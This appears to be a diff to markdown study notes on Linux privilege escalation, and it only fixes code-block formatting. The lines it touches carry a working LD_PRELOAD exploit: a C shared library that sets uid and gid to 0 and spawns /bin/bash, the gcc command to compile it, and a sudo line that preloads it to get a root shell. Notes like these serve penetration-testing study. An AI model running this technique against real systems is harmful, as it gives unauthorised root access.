@@ -116,7 +116,7 @@ Escalation via Intended Functionality
 - We are gonna be able to execute our own library and preload that before we run anything.
 - We need to make malicious library in order to do it.
 - `vim shell.c`
-- c
+```C
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -125,7 +125,8 @@ void_init(){
 	setgid(0);
 	setuid(0);
 	system("/bin/bash");
-}` 
+}
+``` 
 - Compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 - `sudo LD_PRELOAD=/full/path/shell.so <appname>`
 	- Where appname is an ouput of app list from `sudo -l`
